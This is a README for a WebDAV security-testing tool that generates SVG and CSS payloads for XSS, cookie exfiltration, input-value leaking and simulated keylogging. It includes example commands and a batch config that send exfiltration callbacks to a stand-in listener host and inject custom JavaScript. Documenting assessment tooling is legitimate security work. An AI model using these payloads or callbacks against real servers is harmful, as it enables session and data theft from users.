# Enhanced WebDAV Security Assessment Tool (EWT)

The Enhanced WebDAV Security Assessment Tool (EWT) is a Python-based command-line utility designed to help security professionals assess the security posture of WebDAV servers. It focuses on testing how servers handle potentially malicious file uploads and path manipulations, with a special emphasis on payloads embedded within SVG and CSS files.

**SECURITY NOTICE:** This tool is intended for authorized security assessment and educational purposes ONLY. Misuse of this tool on systems for which you do not have explicit, written permission is illegal and unethical. The developers assume no liability and are not responsible for any misuse or damage caused by this program. All actions that involve server interaction can be logged.

## Features

*   **Flexible WebDAV Client**: Interacts with WebDAV servers using PUT, GET, DELETE, and PROPFIND (for directory listing). Supports basic authentication and SSL/TLS.
*   **SVG Payload Generation & Testing**:
    *   Generates various types of SVG payloads designed to test for XSS and other vulnerabilities when SVGs are served and rendered.
    *   Supported SVG types: `basic`, `script_tag` (JS in `<script>`), `event_handler` (JS in `onload` etc.), `animate` (JS in animation events), `foreign_object` (HTML+JS in SVG), `data_exfil` (JS to send data to a callback), `polyglot` (SVG/JS).
*   **CSS Payload Generation & Testing**:
    *   Generates CSS payloads to test for data exfiltration capabilities and other CSS-based attack vectors.
    *   Supported CSS types: `basic`, `background_exfil` (generic exfil via `background-image`), `font_face_exfil` (`@font-face` exfil), `media_query_exfil` (fingerprinting via media queries), `input_value_exfil` (attempt to leak input values), `keylogger_simulation` (simulated keylogging).
*   **Test Orchestration**:
    *   Run single, targeted tests against a WebDAV server.
    *   Execute batches of tests defined in a JSON configuration file.
*   **Parameterizable Payloads**: Customize JavaScript code, callback URLs, and target CSS selectors for generated payloads.
*   **Comprehensive Reporting**: Generates detailed Markdown reports summarizing test activities, successes, failures, and basic security recommendations.
*   **Configurable Output**: Control directories for generated payloads, reports, and logs.
*   **Logging**: Detailed logging of operations for debugging and audit.
*   **Integrated WebDAV Server**: A lightweight, scriptable WebDAV server for hosting payloads locally.

## Requirements

*   Python 3.8+
*   External libraries: `requests`, `wsgidav`, `cheroot`, `textual`

## Installation

1.  Ensure Python 3.8+ is installed.
2.  Clone the repository.
3.  Install the required libraries from `requirements.txt`:
    ```bash
    pip install -r requirements.txt
    ```
    To use the TUI, you will also need to install `textual`:
    ```bash
    pip install textual
    ```

## Usage (`ewt_cli.py`)

The primary entry point is `ewt_cli.py`.

```bash
python ewt_cli.py --help
```

### Common Arguments

*   `--url TARGET_URL`: (Required) The full URL of the target WebDAV server (e.g., `http://localhost/webdav/`).
*   `--username USER`: Username for WebDAV authentication.
*   `--password PASS`: Password for WebDAV authentication.
*   `--timeout SECS`: Request timeout in seconds (default: 30).
*   `--no-verify-ssl`: Disable SSL certificate verification (use with caution for test environments).
*   `--output-dir DIR`: Main directory for tool output (logs, generated payloads). Default: `./ewt_output`.
*   `--report-dir DIR`: Specific directory for Markdown reports. Default: `<output-dir>/reports`.
*   `--log-level LEVEL`: Set console logging level (DEBUG, INFO, WARNING, ERROR, CRITICAL). Default: INFO.

### Running the WebDAV Server

You can start a local WebDAV server to host payloads for testing purposes.

```bash
python ewt_cli.py serve --dir ./my_payloads --port 8080
```

*   `--dir`: The root directory to serve files from (default: `./webdav_root`).
*   `--host`: The host IP to bind to (default: `0.0.0.0`).
*   `--port`: The port to run the server on (default: 8080).

### Running Tests

**1. List Available Tests:**
To see all built-in payload types:
```bash
python ewt_cli.py test --list-tests --url http://ignore.me
```

**2. Run a Single Test:**
Use the format `FILETYPE/PAYLOADNAME`.
```bash
# Basic SVG test
python ewt_cli.py test --url <TARGET_URL> --test svg/basic

# SVG with custom JavaScript in a <script> tag
python ewt_cli.py test --url <TARGET_URL> --test svg/script_tag --js-code "alert('My Custom SVG XSS: ' + document.domain);"

# CSS data exfiltration test using @font-face, with a custom callback
python ewt_cli.py test --url <TARGET_URL> --test css/font_face_exfil --callback-url "https://my.listener.com/css_font_hit"
```

**3. Run Batch Tests from a JSON File:**
Create a JSON file defining multiple tests. Example (`my_tests.json`):
```json
{
  "tests": [
    {
      "file_type": "svg",
      "payload_name": "event_handler",
      "params": {"js_code": "console.warn('SVG event handler from batch');"},
      "remote_target_dir": "my_company_tests/svg_events"
    },
    {
      "file_type": "css",
      "payload_name": "media_query_exfil",
      "params": {"callback_url": "https://my.listener.com/batch_media_query"},
      "remote_target_dir": "my_company_tests/css_fingerprinting"
    }
  ]
}
```
Then run:
```bash
python ewt_cli.py batch --url <TARGET_URL> --config my_tests.json
```
The `remote_target_dir` in the JSON is optional for each test item; the tool will use a default if not provided.

### Output

*   **Generated Payloads**: Saved in `<output-dir>/payloads_generated/`.
*   **Application Log**: A detailed application log is saved to `<output-dir>/enhanced_webdav_tester_app.log`.
*   **Markdown Reports**: Saved in the specified report directory (default: `<output-dir>/reports/`).

## Payload Types Reference

### SVG Payloads (`svg/...`)
*   `basic`: Benign SVG for basic upload/retrieval test.
*   `script_tag`: Embeds JS using `<script><![CDATA[...]]></script>`.
*   `event_handler`: Embeds JS in an SVG event handler (e.g., `onload`).
*   `animate`: Embeds JS in an animation event (e.g., `onbegin`).
*   `foreign_object`: Embeds HTML (which can include `<script>`) within the SVG.
*   `data_exfil`: SVG with JS designed to send data (e.g., `document.cookie`) to a specified callback URL.
*   `polyglot`: A file structured to be valid as both SVG and executable JavaScript.

### CSS Payloads (`css/...`)
*   `basic`: Benign CSS for basic upload/retrieval test.
*   `background_exfil`: Attempts to trigger a request to a callback URL via `background-image: url(...)`.
*   `font_face_exfil`: Uses `@font-face { src: url(...); }` to trigger a request.
*   `media_query_exfil`: Uses various media queries to conditionally request URLs, potentially for device fingerprinting.
*   `input_value_exfil`: Attempts to leak characters from input field values using attribute selectors and `background-image`. Highly browser-dependent.
*   `keylogger_simulation`: Attempts to detect last typed characters in inputs using attribute selectors. Highly browser-dependent.

## Development Notes & Structure

*   `ewt_cli.py`: Main command-line interface.
*   `webdav_security_tester.py`: Orchestrates tests (`WebDAVSecurityTester` class).
*   `webdav_client.py`: Handles WebDAV communications (`WebDAVClient` class).
*   `webdav_server.py`: Provides the integrated WebDAV server (`DAVServer` class).
*   `payload_generator.py`: Base class for payload generation (`PayloadGenerator`).
*   `svg_payload_generator.py`: Generates SVG payloads (`SVGPayloadGenerator` class).
*   `css_payload_generator.py`: Generates CSS payloads (`CSSPayloadGenerator` class).
*   `ewt_tui.py`: A Textual-based user interface for the tool.

## Textual User Interface (TUI)

The tool includes a TUI for interactive use. To run it, execute:

```bash
python ewt_tui.py
```

The TUI provides access to the same features as the CLI, including:
*   Configuring the target WebDAV server.
*   Selecting tests to run.
*   Running tests and viewing live output.
*   Viewing generated reports.
*   Starting and stopping the integrated WebDAV server.

## Disclaimer

This tool is for educational and authorized testing purposes only. The user is responsible for any and all actions performed using this tool. Ensure you comply with all applicable laws and obtain necessary permissions before testing any system.
---
The `requirements.txt` file includes all necessary dependencies for the CLI and WebDAV server. The TUI requires `textual`, which can be installed separately.
